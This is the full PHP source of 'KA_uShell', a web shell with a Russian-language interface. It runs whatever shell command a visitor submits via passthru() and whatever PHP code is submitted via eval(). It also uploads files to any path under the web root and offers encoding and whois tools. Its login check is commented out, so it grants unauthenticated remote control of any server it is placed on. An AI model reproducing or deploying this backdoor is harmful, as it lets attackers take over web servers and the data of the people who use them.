<!--

/+--------------------------------+\
 |            KA_uShell           |
 |    <KAdot Universal Shell>     |
 |         Version 0.1.6          |
 |            13.03.04            |
 |  Author: KAdot <KAdot@ngs.ru>  |
 |--------------------------------|
\+                                +/

-->
<html>
<head>
<title>KA_uShell 0.1.6</title>
<style type="text/css">
<!--
body, table{font-family:Verdana; font-size:12px;}
table {background-color:#EAEAEA; border-width:0px;}
b {font-family:Arial; font-size:15px;}
a{text-decoration:none;}
-->
</style>
</head>
<body>

<?php
$self = $_SERVER['PHP_SELF'];
$docr = $_SERVER['DOCUMENT_ROOT'];
$sern = $_SERVER['SERVER_NAME'];
$tend = "</tr></form></table><br><br><br><br>";

// Configuration
$login = "admin";
$pass = "123";


/*/ Authentication
if (!isset($_SERVER['PHP_AUTH_USER'])) {
header('WWW-Authenticate: Basic realm="KA_uShell"');
header('HTTP/1.0 401 Unauthorized');
exit;}

else {
if(empty($_SERVER['PHP_AUTH_PW']) || $_SERVER['PHP_AUTH_PW']<>$pass || empty($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_USER']<>$login)
{ echo "Что надо?"; exit;}
}
*/



if (!empty($_GET['ac'])) {$ac = $_GET['ac'];}
elseif (!empty($_POST['ac'])) {$ac = $_POST['ac'];}
else {$ac = "shell";}

// Menu
echo "
|<a href=$self?ac=shell>Shell</a>|
|<a href=$self?ac=upload>File Upload</a>|
|<a href=$self?ac=tools>Tools</a>|
|<a href=$self?ac=eval>PHP Eval Code</a>|
|<a href=$self?ac=whois>Whois</a>|
<br><br><br><pre>";


switch($ac) {

// Shell
case "shell":

echo <<<HTML
<b>Shell</b>
<table>
<form action="$self" method="POST">
<input type="hidden" name="ac" value="shell">
<tr><td>
$$sern <input size="50" type="text" name="c"><input align="right" type="submit" value="Enter">
</td></tr>
<tr><td>
<textarea cols="100" rows="25">
HTML;

if (!empty($_POST['c'])){
passthru($_POST['c']);
}
echo "</textarea></td>$tend";
break;


//PHP Eval Code execution
case "eval":

echo <<<HTML
<b>PHP Eval Code</b>
<table>
<form method="POST" action="$self">
<input type="hidden" name="ac" value="eval">
<tr>
<td><textarea name="ephp" rows="10" cols="60"></textarea></td>
</tr>
<tr>
<td><input type="submit" value="Enter"></td>
$tend
HTML;

if (isset($_POST['ephp'])){
eval($_POST['ephp']);
}
break;


//Text tools
case "tools":

echo <<<HTML
<b>Tools</b>
<table>
<form method="POST" action="$self">
<input type="hidden" name="ac" value="tools">
<tr>
<td>
<input type="radio" name="tac" value="1">B64 Decode<br>
<input type="radio" name="tac" value="2">B64 Encode<br><hr>
<input type="radio" name="tac" value="3">md5 Hash
</td>
<td><textarea name="tot" rows="5" cols="42"></textarea></td>
</tr>
<tr>
<td> </td>
<td><input type="submit" value="Enter"></td>
$tend
HTML;

if (!empty($_POST['tot']) && !empty($_POST['tac'])) {

switch($_POST['tac']) {

case "1":
echo "Раскодированный текст:<b>" .base64_decode($_POST['tot']). "</b>";
break;

case "2":
echo "Кодированный текст:<b>" .base64_encode($_POST['tot']). "</b>";
break;

case "3":
echo "Кодированный текст:<b>" .md5($_POST['tot']). "</b>";
break;
}}
break;


// Uploading
case "upload":

echo <<<HTML
<b>File Upload</b>
<table>
<form enctype="multipart/form-data" action="$self" method="POST">
<input type="hidden" name="ac" value="upload">
<tr>
<td>Файло:</td>
<td><input size="48" name="file" type="file"></td>
</tr>
<tr>
<td>Папка:</td>
<td><input size="48" value="$docr/" name="path" type="text"><input type="submit" value="Послать"></td>
$tend
HTML;

if (isset($_POST['path'])){

$uploadfile = $_POST['path'].$_FILES['file']['name'];
if ($_POST['path']==""){$uploadfile = $_FILES['file']['name'];}

if (copy($_FILES['file']['tmp_name'], $uploadfile)) {
    echo "Файло успешно загружен в папку $uploadfile\n";
    echo "Имя:" .$_FILES['file']['name']. "\n";
    echo "Размер:" .$_FILES['file']['size']. "\n";

} else {
    print "Не удаётся загрузить файло. Инфа:\n";
    print_r($_FILES);
}
}
break;


// Whois
case "whois":
echo <<<HTML
<b>Whois</b>
<table>
<form action="$self" method="POST">
<input type="hidden" name="ac" value="whois">
<tr>
<td>Домен:</td>
<td><input size="40" type="text" name="wq"></td>
</tr>
<tr>
<td>Хуйз сервер:</td>
<td><input size="40" type="text" name="wser" value="whois.ripe.net"></td>
</tr>
<tr><td>
<input align="right" type="submit" value="Enter">
</td></tr>
$tend
HTML;

if (isset($_POST['wq']) && $_POST['wq']<>"") {

if (empty($_POST['wser'])) {$wser = "whois.ripe.net";} else $wser = $_POST['wser'];

$querty = $_POST['wq']."\r\n";
$fp = fsockopen($wser, 43);

if (!$fp) {echo "Не могу открыть сокет";} else {
fputs($fp, $querty);
while(!feof($fp)){echo fgets($fp, 4000);}
fclose($fp);
}}
break;


}
?>
</pre>
</body>
</html>